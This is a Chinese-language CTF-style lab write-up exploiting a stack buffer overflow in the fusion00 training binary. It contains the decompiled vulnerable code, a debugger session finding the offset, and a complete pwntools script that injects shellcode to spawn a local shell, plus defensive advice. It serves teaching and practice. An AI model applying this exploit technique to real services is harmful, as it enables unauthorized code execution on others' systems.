# <center>栈溢出实验5</center>

## 实验概述

### 【目的】
1. 运行fusion00，getshell
### 【环境】
Linux
### 【工具】
gcc，python，IDA pro，binwalk
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】

```
$ binwalk fusion00

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
```

```c
char *parse_http_request()
{
  char *v0; // eax
  char buf; // [esp+8h] [ebp-410h]
  int v3; // [esp+Ch] [ebp-40Ch]
  char *s1; // [esp+408h] [ebp-10h]
  char *s; // [esp+40Ch] [ebp-Ch]

  printf("[debug] buffer is at 0x%08x :-)\n", &buf);
  if ( read(0, &buf, 0x400u) <= 0 )
    errx(0, "Failed to read from remote host");
  if ( memcmp(&buf, "GET ", 4u) )
    errx(0, "Not a GET request");
  s = (char *)&v3;
  s1 = strchr((const char *)&v3, 32);
  if ( !s1 )
    errx(0, "No protocol version specified");
  v0 = s1++;
  *v0 = 0;
  if ( strncmp(s1, "HTTP/1.1", 8u) )
    errx(0, "Invalid protocol");
  fix_path(s);
  printf("trying to access %s\n", s);
  return s;
}
```
```c
char *__cdecl fix_path(char *name)
{
  char *result; // eax
  char resolved; // [esp+0h] [ebp-88h]

  if ( realpath(name, &resolved) )
    result = strcpy(name, &resolved);
  else
    result = (char *)1;
  return result;
}
```
这里程序模拟了http请求的功能，对用户的输入数据进行了限制。
其中
```c
if ( memcmp(&buf, "GET ", 4u) )
    errx(0, "Not a GET request");
```
即输入数据须以`GET `打头
其次有
```
 s = (char *)&v3;
  s1 = strchr((const char *)&v3, 32);
  if ( !s1 )
    errx(0, "No protocol version specified");
  v0 = s1++;
  *v0 = 0;
  if ( strncmp(s1, "HTTP/1.1", 8u) )
    errx(0, "Invalid protocol");
```
即输入数据须以` Http/1.1`结尾。
通过checksec发现栈不可执行保护是关闭的。
```
$ checksec fusion00
[*] '/home/lometsj/Documents/5.1/fusion00'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
又有，程序在开始打印了栈的地址。
```c
printf("[debug] buffer is at 0x%08x :-)\n", &buf);
```
通过这个地址可以绕过地址随机化。
可以看到在函数fix_path中有strcpy，存在栈溢出漏洞。
通过pattern功能寻找溢出偏移量。
```
$ gdb fusion00 -q
pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from fusion00...(no debugging symbols found)...done.
pwndbg> pattern_create 600
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs'
pwndbg> r
Starting program: /home/lometsj/Documents/5.1/fusion00 
[debug] buffer is at 0xffffcae8 :-)
GET AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs HTTP/1.1

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x0 
ECX: 0xf7dfa700 (0xf7dfa700)
EDX: 0xffffca40 ("/home/lometsj/D"...)
ESI: 0xf7fad000 --> 0x1b1db0 
EDI: 0xf7fad000 --> 0x1b1db0 
EBP: 0x6941414d ('MAAi')
ESP: 0xffffcad0 ("ANAAjAA9AAOAAkA"...)
EIP: 0x41384141 ('AA8A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41384141
[------------------------------------stack-------------------------------------]
0000| 0xffffcad0 ("ANAAjAA9AAOAAkA"...)
0004| 0xffffcad4 ("jAA9AAOAAkAAPAA"...)
0008| 0xffffcad8 ("AAOAAkAAPAAlAAQ"...)
0012| 0xffffcadc ("AkAAPAAlAAQAAmA"...)
0016| 0xffffcae0 ("PAAlAAQAAmAARAA"...)
0020| 0xffffcae4 ("AAQAAmAARAAoAAS"...)
0024| 0xffffcae8 ("AmAARAAoAASAApA"...)
0028| 0xffffcaec ("RAAoAASAApAATAA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX  0x1
 EBX  0x0
*ECX  0xf7dfa700 ◂— add    byte ptr [edi - 0x54370821], ah /* 0xf7dfa700 */
*EDX  0xffffca40 ◂— 0x6d6f682f ('/hom')
*EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
*ESI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
*EBP  0x6941414d ('MAAi')
*ESP  0xffffcad0 ◂— 0x41414e41 ('ANAA')
*EIP  0x41384141 ('AA8A')
───────────────────────────────────[ DISASM ]───────────────────────────────────
Invalid address 0x41384141










───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffcad0 ◂— 0x41414e41 ('ANAA')
01:0004│      0xffffcad4 ◂— 0x3941416a ('jAA9')
02:0008│      0xffffcad8 ◂— 0x414f4141 ('AAOA')
03:000c│      0xffffcadc ◂— 0x41416b41 ('AkAA')
04:0010│      0xffffcae0 ◂— 0x6c414150 ('PAAl')
05:0014│      0xffffcae4 ◂— 0x41514141 ('AAQA')
06:0018│      0xffffcae8 ◂— 0x41416d41 ('AmAA')
07:001c│      0xffffcaec ◂— 0x6f414152 ('RAAo')
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 41384141
   f 1 41414e41
   f 2 3941416a
   f 3 414f4141
   f 4 41416b41
   f 5 6c414150
   f 6 41514141
   f 7 41416d41
   f 8 6f414152
   f 9 41534141
   f 10 41417041
Program received signal SIGSEGV (fault address 0x41384141)
pwndbg> pattern_offset 0x41384141
1094205761 found at offset: 112
```
查到偏移为112.
下面就可以编写脚本了。
```python
from pwn import *
context.log_level = 'debug'
io = process('./fusion00')


io.recvuntil('at ')
ret = io.recv(10)
io.recv(1024)
ret = int(ret,16)

print "buffer address:"+hex(ret)

payload = 'GET '
payload += 'A' * 112
payload += p32(ret + 4 + 112 + 4 + 1 +8)
payload += ' HTTP/1.1'
payload += asm(shellcraft.i386.sh())

io.sendline(payload)

io.interactive()

```
运行效果
```
$ python fusion00.py 
[+] Starting local process './fusion00': pid 22953
buffer address:0xff8e78d8
[*] Switching to interactive mode
$ echo u got it
u got it
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './fusion00' stopped with exit code 0 (pid 22953)
[*] Got EOF while sending in interactive

```
### 【总结】

本次实验主要体验Linux环境下栈溢出的发生场景，并尝试通过栈溢出覆盖（修改）相邻的变量，达到改变程序执行流的目的。
可以发现，要使栈溢出发生，要满足以下条件：


- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。

